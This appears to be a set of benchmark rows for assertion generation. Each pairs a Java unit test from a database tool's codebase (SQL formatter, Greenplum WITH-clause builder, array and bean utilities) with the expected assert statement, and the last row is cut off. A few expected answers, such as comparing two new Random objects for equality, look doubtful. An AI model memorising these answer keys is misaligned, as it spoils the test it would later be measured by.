generateWithClause(PostgreTable table, PostgreTableBase tableBase) { StringBuilder withClauseBuilder = new StringBuilder();  if (tableSupportsAndHasOids(table) && tableIsGreenplumWithRelOptions(table, tableBase)) { withClauseBuilder.append(""\nWITH (\n\tOIDS="").append(table.isHasOids() ? ""TRUE"" : ""FALSE""); for (String option : tableBase.getRelOptions()) { withClauseBuilder.append(format("",\n\t%s"", option)); } withClauseBuilder.append(""\n)""); } else if (tableSupportsAndHasOids(table)) { withClauseBuilder.append(""\nWITH (\n\tOIDS="").append(table.isHasOids() ? ""TRUE"" : ""FALSE""); withClauseBuilder.append(""\n)""); } else if (tableIsGreenplumWithRelOptions(table, tableBase)) { String[] options = tableBase.getRelOptions(); withClauseBuilder.append(format(""\nWITH (\n\t%s"", options[0])); for (int i = 1; i < options.length; i++) { String option = options[i]; withClauseBuilder.append(format("",\n\t%s"", option)); } withClauseBuilder.append(""\n)""); }  return withClauseBuilder.toString(); }"	"assertEquals("""", withClause)"
"generateWithClause_whenTableWithOidsWithoutOptions_shouldDisplayWithClauseWithOids() {  setupGeneralWhenMocks(true, true);  when(tableBase.getRelOptions()).thenReturn(null);  String withClause = generateWithClause(table, tableBase); ""<AssertPlaceHolder>""; }
generateWithClause(PostgreTable table, PostgreTableBase tableBase) { StringBuilder withClauseBuilder = new StringBuilder();  if (tableSupportsAndHasOids(table) && tableIsGreenplumWithRelOptions(table, tableBase)) { withClauseBuilder.append(""\nWITH (\n\tOIDS="").append(table.isHasOids() ? ""TRUE"" : ""FALSE""); for (String option : tableBase.getRelOptions()) { withClauseBuilder.append(format("",\n\t%s"", option)); } withClauseBuilder.append(""\n)""); } else if (tableSupportsAndHasOids(table)) { withClauseBuilder.append(""\nWITH (\n\tOIDS="").append(table.isHasOids() ? ""TRUE"" : ""FALSE""); withClauseBuilder.append(""\n)""); } else if (tableIsGreenplumWithRelOptions(table, tableBase)) { String[] options = tableBase.getRelOptions(); withClauseBuilder.append(format(""\nWITH (\n\t%s"", options[0])); for (int i = 1; i < options.length; i++) { String option = options[i]; withClauseBuilder.append(format("",\n\t%s"", option)); } withClauseBuilder.append(""\n)""); }  return withClauseBuilder.toString(); }"	"assertEquals(""\nWITH (\n\tOIDS=TRUE\n)"", withClause)"
"generateWithClause_whenTableWithOidsWithMultipleOptions_shouldDisplayWithClauseWithOidsAndAllTheOptions() {  setupGeneralWhenMocks(true, true);  when(tableBase.getRelOptions()).thenReturn(new String[]{""appendonly=true"", ""orientation=column""});  String withClause = generateWithClause(table, tableBase); ""<AssertPlaceHolder>""; }
generateWithClause(PostgreTable table, PostgreTableBase tableBase) { StringBuilder withClauseBuilder = new StringBuilder();  if (tableSupportsAndHasOids(table) && tableIsGreenplumWithRelOptions(table, tableBase)) { withClauseBuilder.append(""\nWITH (\n\tOIDS="").append(table.isHasOids() ? ""TRUE"" : ""FALSE""); for (String option : tableBase.getRelOptions()) { withClauseBuilder.append(format("",\n\t%s"", option)); } withClauseBuilder.append(""\n)""); } else if (tableSupportsAndHasOids(table)) { withClauseBuilder.append(""\nWITH (\n\tOIDS="").append(table.isHasOids() ? ""TRUE"" : ""FALSE""); withClauseBuilder.append(""\n)""); } else if (tableIsGreenplumWithRelOptions(table, tableBase)) { String[] options = tableBase.getRelOptions(); withClauseBuilder.append(format(""\nWITH (\n\t%s"", options[0])); for (int i = 1; i < options.length; i++) { String option = options[i]; withClauseBuilder.append(format("",\n\t%s"", option)); } withClauseBuilder.append(""\n)""); }  return withClauseBuilder.toString(); }"	"assertEquals(""\nWITH (\n\tOIDS=TRUE,\n\tappendonly=true,\n\torientation=column\n)"", withClause)"
"createRelationOfClass_whenTableIsNotAGreenplumTable_returnsInstanceOfPostgresTableBase() { Assert.""<AssertPlaceHolder>""; }
createRelationOfClass(PostgreSchema schema, PostgreClass.RelKind kind, JDBCResultSet dbResult) { if (kind == PostgreClass.RelKind.r) { if (isRelationExternal(dbResult)) { return new GreenplumExternalTable(schema, dbResult); } return new GreenplumTable(schema, dbResult); } return super.createRelationOfClass(schema, kind, dbResult); }"	assertEquals(PostgreTableRegular.class, server.createRelationOfClass(mockSchema, PostgreClass.RelKind.p, mockResults).getClass())
"createWithClause_whenOidsAreSupported_shouldDisplayWithClauseWithOidsAsTrue() { setupGeneralWhenMocks(true);  String withClause = serverExtension.createWithClause(table, null); ""<AssertPlaceHolder>""; }
createWithClause(PostgreTableRegular table, PostgreTableBase tableBase) { StringBuilder withClauseBuilder = new StringBuilder();  boolean hasExtraOptions = dataSource.isServerVersionAtLeast(8, 2) && table.getRelOptions() != null; boolean tableSupportOids = table.getDataSource().getServerType().supportsOids() && table.isHasOids() && table.getDataSource().getServerType().supportsHasOidsColumn();  List<String> extraOptions = new ArrayList<>();  if (tableSupportOids) { extraOptions.add(""OIDS=TRUE""); } if (hasExtraOptions) { extraOptions.addAll(Arrays.asList(table.getRelOptions())); }  if (!CommonUtils.isEmpty(extraOptions)) { withClauseBuilder.append(""\nWITH (""); for (int i = 0; i < extraOptions.size(); i++) { if (i > 0) { withClauseBuilder.append("",""); } withClauseBuilder.append(""\n\t""); withClauseBuilder.append(extraOptions.get(i)); } withClauseBuilder.append(""\n)""); }  return withClauseBuilder.toString(); }"	"assertEquals(""\nWITH (\n\tOIDS=TRUE\n)"", withClause)"
"createWithClause_whenTableSupportsOidsButDoesNotHaveOids_shouldNotDisplayWithClause() { setupGeneralWhenMocks(false);  String withClause = serverExtension.createWithClause(table, null); ""<AssertPlaceHolder>""; }
createWithClause(PostgreTableRegular table, PostgreTableBase tableBase) { StringBuilder withClauseBuilder = new StringBuilder();  boolean hasExtraOptions = dataSource.isServerVersionAtLeast(8, 2) && table.getRelOptions() != null; boolean tableSupportOids = table.getDataSource().getServerType().supportsOids() && table.isHasOids() && table.getDataSource().getServerType().supportsHasOidsColumn();  List<String> extraOptions = new ArrayList<>();  if (tableSupportOids) { extraOptions.add(""OIDS=TRUE""); } if (hasExtraOptions) { extraOptions.addAll(Arrays.asList(table.getRelOptions())); }  if (!CommonUtils.isEmpty(extraOptions)) { withClauseBuilder.append(""\nWITH (""); for (int i = 0; i < extraOptions.size(); i++) { if (i > 0) { withClauseBuilder.append("",""); } withClauseBuilder.append(""\n\t""); withClauseBuilder.append(extraOptions.get(i)); } withClauseBuilder.append(""\n)""); }  return withClauseBuilder.toString(); }"	"assertEquals("""", withClause)"
"createWithClause_whenTableDoesNotSupportsOids_shouldNotDisplayWithClause() { setupGeneralWhenMocks(false);  String withClause = serverExtension.createWithClause(table, null); ""<AssertPlaceHolder>""; }
createWithClause(PostgreTableRegular table, PostgreTableBase tableBase) { StringBuilder withClauseBuilder = new StringBuilder();  boolean hasExtraOptions = dataSource.isServerVersionAtLeast(8, 2) && table.getRelOptions() != null; boolean tableSupportOids = table.getDataSource().getServerType().supportsOids() && table.isHasOids() && table.getDataSource().getServerType().supportsHasOidsColumn();  List<String> extraOptions = new ArrayList<>();  if (tableSupportOids) { extraOptions.add(""OIDS=TRUE""); } if (hasExtraOptions) { extraOptions.addAll(Arrays.asList(table.getRelOptions())); }  if (!CommonUtils.isEmpty(extraOptions)) { withClauseBuilder.append(""\nWITH (""); for (int i = 0; i < extraOptions.size(); i++) { if (i > 0) { withClauseBuilder.append("",""); } withClauseBuilder.append(""\n\t""); withClauseBuilder.append(extraOptions.get(i)); } withClauseBuilder.append(""\n)""); }  return withClauseBuilder.toString(); }"	"assertEquals("""", withClause)"
"Exception { PostgreTableRegular tableRegular = new PostgreTableRegular(testSchema) { @Override public boolean isTablespaceSpecified() { return false; } }; tableRegular.setPartition(false); addColumn(tableRegular, ""column1"", ""int4"", 1); addColumn(tableRegular, ""column2"", ""varchar"", 1);  String expectedDDL = ""-- Drop table"" + lineBreak + lineBreak + ""-- DROP TABLE test;"" + lineBreak + lineBreak + ""CREATE TABLE test ("" + lineBreak + ""\tcolumn1 int4 NULL,"" + lineBreak + ""\tcolumn2 varchar NULL"" + lineBreak + "");"" + lineBreak;  String tableDDL = tableRegular.getObjectDefinitionText(monitor, Collections.emptyMap()); Assert.""<AssertPlaceHolder>""; }
setPartition(boolean partition) { isPartition = partition; }"	assertEquals(tableDDL, expectedDDL)
"shouldDoDefaultFormat() { //given String expectedString = getExpectedString(); String inputString = ""SELECT * FROM TABLE1 t WHERE a > 100 AND b BETWEEN 12 AND 45;  SELECT t.*, j1.x, j2.y FROM TABLE1 t JOIN JT1 j1 ON j1.a = t.a LEFT OUTER JOIN JT2 j2 ON j2.a = t.a AND j2.b = j1.b WHERE t.xxx NOT NULL;  DELETE FROM TABLE1 WHERE a = 1;  UPDATE TABLE1 SET a = 2 WHERE a = 1;  SELECT table1.id, table2.number, SUM(table1.amount) FROM table1 INNER JOIN table2 ON table.id = table2.table1_id WHERE table1.id IN ( SELECT table1_id FROM table3 WHERE table3.name = 'Foo Bar' AND table3.type = 'unknown_type') GROUP BY table1.id, table2.number ORDER BY table1.id;\n"";  Mockito.when(preferenceStore.getBoolean(Mockito.eq(ModelPreferences.SQL_FORMAT_LF_BEFORE_COMMA))).thenReturn(false);  //when String formattedString = formatter.format(inputString, configuration);  //then  ""<AssertPlaceHolder>""; }
format(final String argSql, SQLFormatterConfiguration configuration) { formatterCfg = configuration;  for (String delim : formatterCfg.getSyntaxManager().getStatementDelimiters()) { statementDelimiters.add(delim.toUpperCase(Locale.ENGLISH)); }  SQLTokensParser fParser = new SQLTokensParser(formatterCfg);  boolean isSqlEndsWithNewLine = false; if (argSql.endsWith(""\n"")) { //$NON-NLS-1$ isSqlEndsWithNewLine = true; }  List<FormatterToken> list = fParser.parse(argSql); list = format(list);  StringBuilder after = new StringBuilder(argSql.length() + 20); for (FormatterToken token : list) { after.append(token.getString()); }  if (isSqlEndsWithNewLine) { after.append(GeneralUtils.getDefaultLineSeparator()); }  return after.toString(); }"	assertEquals(expectedString, formattedString)
"shouldReturnEmptyStringWhenThereIsOnlyOneSpace() { //given String expectedString = """"; String inputString = "" "";  //when String format = formatter.format(inputString, configuration);  //then ""<AssertPlaceHolder>""; }
format(final String argSql, SQLFormatterConfiguration configuration) { formatterCfg = configuration;  for (String delim : formatterCfg.getSyntaxManager().getStatementDelimiters()) { statementDelimiters.add(delim.toUpperCase(Locale.ENGLISH)); }  SQLTokensParser fParser = new SQLTokensParser(formatterCfg);  boolean isSqlEndsWithNewLine = false; if (argSql.endsWith(""\n"")) { //$NON-NLS-1$ isSqlEndsWithNewLine = true; }  List<FormatterToken> list = fParser.parse(argSql); list = format(list);  StringBuilder after = new StringBuilder(argSql.length() + 20); for (FormatterToken token : list) { after.append(token.getString()); }  if (isSqlEndsWithNewLine) { after.append(GeneralUtils.getDefaultLineSeparator()); }  return after.toString(); }"	assertEquals(expectedString, format)
"shouldMakeUpperCaseForKeywords() { //given String expectedString = ""SELECT"" + lineBreak + ""\t*"" + lineBreak + ""FROM"" + lineBreak + ""\tmytable;""; String inputString = ""select * from mytable;"";  //when String formattedString = formatter.format(inputString, configuration);  //then ""<AssertPlaceHolder>""; }
format(final String argSql, SQLFormatterConfiguration configuration) { formatterCfg = configuration;  for (String delim : formatterCfg.getSyntaxManager().getStatementDelimiters()) { statementDelimiters.add(delim.toUpperCase(Locale.ENGLISH)); }  SQLTokensParser fParser = new SQLTokensParser(formatterCfg);  boolean isSqlEndsWithNewLine = false; if (argSql.endsWith(""\n"")) { //$NON-NLS-1$ isSqlEndsWithNewLine = true; }  List<FormatterToken> list = fParser.parse(argSql); list = format(list);  StringBuilder after = new StringBuilder(argSql.length() + 20); for (FormatterToken token : list) { after.append(token.getString()); }  if (isSqlEndsWithNewLine) { after.append(GeneralUtils.getDefaultLineSeparator()); }  return after.toString(); }"	assertEquals(expectedString, formattedString)
"shouldRemoveSpacesBeforeCommentSymbol() { //given String expectedString = ""SELECT"" + lineBreak + ""\t*"" + lineBreak + ""FROM"" + lineBreak + ""\ttable1;"" + lineBreak + ""-- SELECT * FROM mytable;""; String inputString = ""SELECT"" + lineBreak + ""\t*"" + lineBreak + ""FROM"" + lineBreak + ""\ttable1;"" + lineBreak +"" -- SELECT * FROM mytable;"";  //when String formattedString = formatter.format(inputString, configuration);  //then ""<AssertPlaceHolder>""; }
format(final String argSql, SQLFormatterConfiguration configuration) { formatterCfg = configuration;  for (String delim : formatterCfg.getSyntaxManager().getStatementDelimiters()) { statementDelimiters.add(delim.toUpperCase(Locale.ENGLISH)); }  SQLTokensParser fParser = new SQLTokensParser(formatterCfg);  boolean isSqlEndsWithNewLine = false; if (argSql.endsWith(""\n"")) { //$NON-NLS-1$ isSqlEndsWithNewLine = true; }  List<FormatterToken> list = fParser.parse(argSql); list = format(list);  StringBuilder after = new StringBuilder(argSql.length() + 20); for (FormatterToken token : list) { after.append(token.getString()); }  if (isSqlEndsWithNewLine) { after.append(GeneralUtils.getDefaultLineSeparator()); }  return after.toString(); }"	assertEquals(expectedString, formattedString)
"shouldAddLineBreakIfScriptStartsWithComment() { //given String expectedString = lineBreak + ""-- SELECT * FROM mytable;""; String inputString = ""-- SELECT * FROM mytable;"";  //when String formattedString = formatter.format(inputString, configuration);  //then ""<AssertPlaceHolder>""; }
format(final String argSql, SQLFormatterConfiguration configuration) { formatterCfg = configuration;  for (String delim : formatterCfg.getSyntaxManager().getStatementDelimiters()) { statementDelimiters.add(delim.toUpperCase(Locale.ENGLISH)); }  SQLTokensParser fParser = new SQLTokensParser(formatterCfg);  boolean isSqlEndsWithNewLine = false; if (argSql.endsWith(""\n"")) { //$NON-NLS-1$ isSqlEndsWithNewLine = true; }  List<FormatterToken> list = fParser.parse(argSql); list = format(list);  StringBuilder after = new StringBuilder(argSql.length() + 20); for (FormatterToken token : list) { after.append(token.getString()); }  if (isSqlEndsWithNewLine) { after.append(GeneralUtils.getDefaultLineSeparator()); }  return after.toString(); }"	assertEquals(expectedString, formattedString)
"shouldAddLineBreakBeforeBraceBySpecialSetting() { //given String expectedString = getExpectedStringWithLineBreakBeforeBraces(); String inputString = ""SELECT (SELECT thecol FROM thetable) FROM dual"";  Mockito.when(preferenceStore.getBoolean(Mockito.eq(ModelPreferences.SQL_FORMAT_LF_BEFORE_COMMA))).thenReturn(false); Mockito.when(preferenceStore.getBoolean(Mockito.eq(ModelPreferences.SQL_FORMAT_BREAK_BEFORE_CLOSE_BRACKET))).thenReturn(true);  //when String formattedString = formatter.format(inputString, configuration);  //then ""<AssertPlaceHolder>""; }
format(final String argSql, SQLFormatterConfiguration configuration) { formatterCfg = configuration;  for (String delim : formatterCfg.getSyntaxManager().getStatementDelimiters()) { statementDelimiters.add(delim.toUpperCase(Locale.ENGLISH)); }  SQLTokensParser fParser = new SQLTokensParser(formatterCfg);  boolean isSqlEndsWithNewLine = false; if (argSql.endsWith(""\n"")) { //$NON-NLS-1$ isSqlEndsWithNewLine = true; }  List<FormatterToken> list = fParser.parse(argSql); list = format(list);  StringBuilder after = new StringBuilder(argSql.length() + 20); for (FormatterToken token : list) { after.append(token.getString()); }  if (isSqlEndsWithNewLine) { after.append(GeneralUtils.getDefaultLineSeparator()); }  return after.toString(); }"	assertEquals(expectedString, formattedString)
"shouldAddIndentForName() { //given String expectedString = ""SELECT""+lineBreak + ""\tmy_field"" + lineBreak + ""FROM"" + lineBreak + ""\tmy_table""; String inputString = ""SELECT my_field FROM my_table"";  Mockito.when(preferenceStore.getBoolean(Mockito.eq(ModelPreferences.SQL_FORMAT_LF_BEFORE_COMMA))).thenReturn(false); Mockito.when(preferenceStore.getBoolean(Mockito.eq(ModelPreferences.SQL_FORMAT_BREAK_BEFORE_CLOSE_BRACKET))).thenReturn(true);  //when String formattedString = formatter.format(inputString, configuration);  //then ""<AssertPlaceHolder>""; }
format(final String argSql, SQLFormatterConfiguration configuration) { formatterCfg = configuration;  for (String delim : formatterCfg.getSyntaxManager().getStatementDelimiters()) { statementDelimiters.add(delim.toUpperCase(Locale.ENGLISH)); }  SQLTokensParser fParser = new SQLTokensParser(formatterCfg);  boolean isSqlEndsWithNewLine = false; if (argSql.endsWith(""\n"")) { //$NON-NLS-1$ isSqlEndsWithNewLine = true; }  List<FormatterToken> list = fParser.parse(argSql); list = format(list);  StringBuilder after = new StringBuilder(argSql.length() + 20); for (FormatterToken token : list) { after.append(token.getString()); }  if (isSqlEndsWithNewLine) { after.append(GeneralUtils.getDefaultLineSeparator()); }  return after.toString(); }"	assertEquals(expectedString, formattedString)
"shouldDoDefaultFormatForCreateStatementWhenIndentSubstatementsInParenthesesOff() { //given String inputString = ""CREATE TABLE Persons (PersonID int, LastName varchar(255), FirstName varchar(255), Address varchar(255), City varchar(255));""; String expectedString = ""CREATE TABLE Persons (PersonID int,"" + lineBreak + ""LastName varchar(255),"" + lineBreak + ""FirstName varchar(255),"" + lineBreak + ""Address varchar(255),"" + lineBreak + ""City varchar(255));"";  Mockito.when(preferenceStore.getBoolean(Mockito.eq(ModelPreferences.SQL_FORMAT_BREAK_BEFORE_CLOSE_BRACKET))).thenReturn(false);  //when String formattedString = formatter.format(inputString, configuration);  //then ""<AssertPlaceHolder>""; }
format(final String argSql, SQLFormatterConfiguration configuration) { formatterCfg = configuration;  for (String delim : formatterCfg.getSyntaxManager().getStatementDelimiters()) { statementDelimiters.add(delim.toUpperCase(Locale.ENGLISH)); }  SQLTokensParser fParser = new SQLTokensParser(formatterCfg);  boolean isSqlEndsWithNewLine = false; if (argSql.endsWith(""\n"")) { //$NON-NLS-1$ isSqlEndsWithNewLine = true; }  List<FormatterToken> list = fParser.parse(argSql); list = format(list);  StringBuilder after = new StringBuilder(argSql.length() + 20); for (FormatterToken token : list) { after.append(token.getString()); }  if (isSqlEndsWithNewLine) { after.append(GeneralUtils.getDefaultLineSeparator()); }  return after.toString(); }"	assertEquals(expectedString, formattedString)
"shouldDoDefaultFormatForCreateStatementWhenIndentSubstatementsInParenthesesOn() { //given String inputString = ""CREATE TABLE Persons (PersonID int, LastName varchar(255), FirstName varchar(255), Address varchar(255), City varchar(255));""; String expectedString = ""CREATE TABLE Persons ("" + lineBreak + ""\tPersonID int,"" + lineBreak + ""\tLastName varchar(255),"" + lineBreak + ""\tFirstName varchar(255),"" + lineBreak + ""\tAddress varchar(255),"" + lineBreak + ""\tCity varchar(255)"" + lineBreak + "");"";  Mockito.when(preferenceStore.getBoolean(Mockito.eq(ModelPreferences.SQL_FORMAT_BREAK_BEFORE_CLOSE_BRACKET))).thenReturn(true);  //when String formattedString = formatter.format(inputString, configuration);  //then ""<AssertPlaceHolder>""; }
format(final String argSql, SQLFormatterConfiguration configuration) { formatterCfg = configuration;  for (String delim : formatterCfg.getSyntaxManager().getStatementDelimiters()) { statementDelimiters.add(delim.toUpperCase(Locale.ENGLISH)); }  SQLTokensParser fParser = new SQLTokensParser(formatterCfg);  boolean isSqlEndsWithNewLine = false; if (argSql.endsWith(""\n"")) { //$NON-NLS-1$ isSqlEndsWithNewLine = true; }  List<FormatterToken> list = fParser.parse(argSql); list = format(list);  StringBuilder after = new StringBuilder(argSql.length() + 20); for (FormatterToken token : list) { after.append(token.getString()); }  if (isSqlEndsWithNewLine) { after.append(GeneralUtils.getDefaultLineSeparator()); }  return after.toString(); }"	assertEquals(expectedString, formattedString)
"shouldDoDefaultFormatForAlterStatementWhenIndentSubstatementsInParenthesesOn() { //given String inputString = ""ALTER TABLE `users` ADD COLUMN (count_copy smallint(6) NOT NULL, status int(10) unsigned NOT NULL) AFTER `lastname`;""; String expectedString = ""ALTER TABLE `users` ADD COLUMN ("" + lineBreak + ""\tcount_copy SMALLINT(6) NOT NULL,"" + lineBreak + ""\tstatus int(10) unsigned NOT NULL"" + lineBreak + "") AFTER `lastname`;"";  Mockito.when(preferenceStore.getBoolean(Mockito.eq(ModelPreferences.SQL_FORMAT_BREAK_BEFORE_CLOSE_BRACKET))).thenReturn(true);  //when String formattedString = formatter.format(inputString, configuration);  //then ""<AssertPlaceHolder>""; }
format(final String argSql, SQLFormatterConfiguration configuration) { formatterCfg = configuration;  for (String delim : formatterCfg.getSyntaxManager().getStatementDelimiters()) { statementDelimiters.add(delim.toUpperCase(Locale.ENGLISH)); }  SQLTokensParser fParser = new SQLTokensParser(formatterCfg);  boolean isSqlEndsWithNewLine = false; if (argSql.endsWith(""\n"")) { //$NON-NLS-1$ isSqlEndsWithNewLine = true; }  List<FormatterToken> list = fParser.parse(argSql); list = format(list);  StringBuilder after = new StringBuilder(argSql.length() + 20); for (FormatterToken token : list) { after.append(token.getString()); }  if (isSqlEndsWithNewLine) { after.append(GeneralUtils.getDefaultLineSeparator()); }  return after.toString(); }"	assertEquals(expectedString, formattedString)
"shouldDoDefaultFormatForValuesNestedInTheFunctionAndDoNotMakeALineBreakAfterTheCommaForThem() { //given String inputString = ""SELECT to_date(CONCAT(YEAR('2019-12-31'),'-',lpad(CEIL(MONTH('2019-12-31')/3)*3-2, 2, 0),'-01')) AS season_first_day""; //#7509 String expectedString = ""SELECT"" + lineBreak + ""\tto_date(CONCAT(YEAR('2019-12-31'), '-', lpad(CEIL(MONTH('2019-12-31')/ 3)* 3-2, 2, 0), '-01')) AS season_first_day"";  Mockito.when(configuration.isFunction(""to_date"")).thenReturn(true); Mockito.when(configuration.isFunction(""lpad"")).thenReturn(true);  //when String formattedString = formatter.format(inputString, configuration);  //then ""<AssertPlaceHolder>""; }
format(final String argSql, SQLFormatterConfiguration configuration) { formatterCfg = configuration;  for (String delim : formatterCfg.getSyntaxManager().getStatementDelimiters()) { statementDelimiters.add(delim.toUpperCase(Locale.ENGLISH)); }  SQLTokensParser fParser = new SQLTokensParser(formatterCfg);  boolean isSqlEndsWithNewLine = false; if (argSql.endsWith(""\n"")) { //$NON-NLS-1$ isSqlEndsWithNewLine = true; }  List<FormatterToken> list = fParser.parse(argSql); list = format(list);  StringBuilder after = new StringBuilder(argSql.length() + 20); for (FormatterToken token : list) { after.append(token.getString()); }  if (isSqlEndsWithNewLine) { after.append(GeneralUtils.getDefaultLineSeparator()); }  return after.toString(); }"	assertEquals(expectedString, formattedString)
"shouldDoDefaultFormatForSubSelectAndForValuesNestedInTheFunctionAndDoNotMakeALineBreakAfterTheCommaForThem() { //given String inputString = ""CREATE VIEW bi_gaz_check_curve AS (SELECT cal.date, pay.check_id, COALESCE(pay.base_amount, pay.amount) amount_ars, pay.future_pay_due_date due_date, pay.cleared_date, pay.check_date issued_date FROM (SELECT generate_series('2010-01-01'::date, '2050-12-31'::date, INTERVAL '1 day') date, 1 payment_id) cal LEFT JOIN oracle.ap_checks_all pay ON cal.date >= pay.check_date AND cal.date <= (pay.future_pay_due_date::date + 30));""; //#9365 String expectedString = ""CREATE VIEW bi_gaz_check_curve AS ("" + lineBreak + ""SELECT"" + lineBreak + ""\tcal.date,"" + lineBreak + ""\tpay.check_id,"" + lineBreak + ""\tCOALESCE(pay.base_amount, pay.amount) amount_ars,"" + lineBreak + ""\tpay.future_pay_due_date due_date,"" + lineBreak + ""\tpay.cleared_date,"" + lineBreak + ""\tpay.check_date issued_date"" + lineBreak + ""FROM"" + lineBreak + ""\t("" + lineBreak + ""\tSELECT"" + lineBreak + ""\t\tgenerate_series('2010-01-01'::date, '2050-12-31'::date, INTERVAL '1 day') date,"" + lineBreak + ""\t\t1 payment_id) cal"" + lineBreak + ""LEFT JOIN oracle.ap_checks_all pay ON"" + lineBreak + ""\tcal.date >= pay.check_date"" + lineBreak + ""\tAND cal.date <= (pay.future_pay_due_date::date + 30));"";  Mockito.when(configuration.isFunction(""COALESCE"")).thenReturn(true); Mockito.when(configuration.isFunction(""generate_series"")).thenReturn(true);  //when String formattedString = formatter.format(inputString, configuration);  //then ""<AssertPlaceHolder>""; }
format(final String argSql, SQLFormatterConfiguration configuration) { formatterCfg = configuration;  for (String delim : formatterCfg.getSyntaxManager().getStatementDelimiters()) { statementDelimiters.add(delim.toUpperCase(Locale.ENGLISH)); }  SQLTokensParser fParser = new SQLTokensParser(formatterCfg);  boolean isSqlEndsWithNewLine = false; if (argSql.endsWith(""\n"")) { //$NON-NLS-1$ isSqlEndsWithNewLine = true; }  List<FormatterToken> list = fParser.parse(argSql); list = format(list);  StringBuilder after = new StringBuilder(argSql.length() + 20); for (FormatterToken token : list) { after.append(token.getString()); }  if (isSqlEndsWithNewLine) { after.append(GeneralUtils.getDefaultLineSeparator()); }  return after.toString(); }"	assertEquals(expectedString, formattedString)
"testConcatArrays() { Assert.""<AssertPlaceHolder>""; }
concatArrays(@NotNull T[] first, @NotNull T[] second) { T[] result = Arrays.copyOf(first, first.length + second.length); System.arraycopy(second, 0, result, first.length, second.length); return result; }"	"assertArrayEquals(new String[]{""a"", ""b""}, ArrayUtils.concatArrays(new String[]{""a""}, new String[]{""b""}))"
"testToArray() { List<String> list = new ArrayList<>(); list.add(""a""); Assert.""<AssertPlaceHolder>""; }
toArray(Class<T> type, Collection<? extends T> list) { return list.toArray((T[]) Array.newInstance(type, list.size())); }"	"assertEquals(new String[]{""a""}, ArrayUtils.toArray(Object.class, list))"
"testIsArrayType() { Assert.""<AssertPlaceHolder>""; }
isArrayType(Type type) { return (type instanceof Class && ((Class<?>) type).isArray()); }"	assertFalse(BeanUtils.isArrayType(String.class))
"testIsCollectionType() { Assert.""<AssertPlaceHolder>""; }
isCollectionType(Type type) { if (type instanceof Class && Collection.class.isAssignableFrom((Class<?>) type)) { /* if (type instanceof ParameterizedType) { ParameterizedType pt = (ParameterizedType)type; if (pt.getActualTypeArguments().length == 1) { return true; } } */ return true; } return isArrayType(type); }"	assertFalse(BeanUtils.isCollectionType(String.class))
"testGetCollectionType2() { WildcardType wildcardType = new WildcardType() { @Override public Type[] getUpperBounds() { return new Type[]{String.class, Integer.class}; }  @Override public Type[] getLowerBounds() { return new Type[0]; } };  ParameterizedType parameterizedType = new ParameterizedType() { @Override public Type[] getActualTypeArguments() { return new Type[]{wildcardType}; }  @Override public Type getRawType() { return null; }  @Override public Type getOwnerType() { return null; } };  Assert.""<AssertPlaceHolder>""; }
getCollectionType(Type type) { if (type instanceof ParameterizedType) { ParameterizedType pt = (ParameterizedType) type; if (pt.getActualTypeArguments().length == 1) { final Type argType = pt.getActualTypeArguments()[0]; if (argType instanceof Class) { return (Class<?>) argType; } else if (argType instanceof WildcardType) { final Type[] upperBounds = ((WildcardType) argType).getUpperBounds(); if (upperBounds.length > 0 && upperBounds[0] instanceof Class) { return (Class<?>) upperBounds[0]; } final Type[] lowerBounds = ((WildcardType) argType).getLowerBounds(); if (lowerBounds.length > 0 && lowerBounds[0] instanceof Class) { return (Class<?>) lowerBounds[0]; } } } } return null; }"	assertEquals(String.class, BeanUtils.getCollectionType(parameterizedType))
"testGetCollectionType3() { WildcardType wildcardType = new WildcardType() { @Override public Type[] getUpperBounds() { return new Type[0]; }  @Override public Type[] getLowerBounds() { return new Type[]{String.class, Integer.class}; } };  ParameterizedType parameterizedType = new ParameterizedType() { @Override public Type[] getActualTypeArguments() { return new Type[]{wildcardType}; }  @Override public Type getRawType() { return null; }  @Override public Type getOwnerType() { return null; } };  Assert.""<AssertPlaceHolder>""; }
getCollectionType(Type type) { if (type instanceof ParameterizedType) { ParameterizedType pt = (ParameterizedType) type; if (pt.getActualTypeArguments().length == 1) { final Type argType = pt.getActualTypeArguments()[0]; if (argType instanceof Class) { return (Class<?>) argType; } else if (argType instanceof WildcardType) { final Type[] upperBounds = ((WildcardType) argType).getUpperBounds(); if (upperBounds.length > 0 && upperBounds[0] instanceof Class) { return (Class<?>) upperBounds[0]; } final Type[] lowerBounds = ((WildcardType) argType).getLowerBounds(); if (lowerBounds.length > 0 && lowerBounds[0] instanceof Class) { return (Class<?>) lowerBounds[0]; } } } } return null; }"	assertEquals(String.class, BeanUtils.getCollectionType(parameterizedType))
"testToLong() { Assert.""<AssertPlaceHolder>""; }
toLong(@Nullable Object object) { return toLong(object, 0); }"	assertEquals(1, CommonUtils.toLong(1L))
"testFilterCollection() { final ArrayList<Object> collection = new ArrayList<>(); collection.add(""a""); collection.add(1); Assert.""<AssertPlaceHolder>""; }
filterCollection(@NotNull Collection<?> collection, @NotNull Class<T> type) { List<T> result = new ArrayList<>(); for (Object item : collection) { if (type.isInstance(item)) { result.add(type.cast(item)); } } return result; }"	"assertEquals(new String[] { ""a"" }, CommonUtils.filterCollection(collection, String.class).toArray())"
"Exception { final SecureRandom random = PowerMockito.mock(SecureRandom.class); PowerMockito.whenNew(SecureRandom.class).withNoArguments().thenReturn(random); PowerMockito.when(random.nextLong()).thenReturn(0L); Assert.""<AssertPlaceHolder>""; }
generateRandomLong() { SecureRandom random = new SecureRandom(); return random.nextLong(); }"	assertEquals(0L, SecurityUtils.generateRandomLong())
"Exception { final SecureRandom random = PowerMockito.mock(SecureRandom.class); PowerMockito.whenNew(SecureRandom.class).withNoArguments().thenReturn(random); PowerMockito.when(random.nextInt(anyInt())).thenReturn(0, 1, 2, 3, 4, 5, 6, 7); Assert.""<AssertPlaceHolder>""; }
generatePassword() { return generatePassword(DEFAULT_PASSWORD_LENGTH); }"	"assertEquals(""ABCDEFGH"", SecurityUtils.generatePassword())"
"Exception { final Random random = PowerMockito.mock(Random.class); PowerMockito.whenNew(Random.class).withParameterTypes(long.class).withArguments(anyLong()).thenReturn(random); Assert.""<AssertPlaceHolder>""; }
getRandom() { return random; }"	assertEquals(new Random(0L), SecurityUtils.getRandom())
"checkEqual_ReturnsTrue() { ""<AssertPlaceHolder>""; }
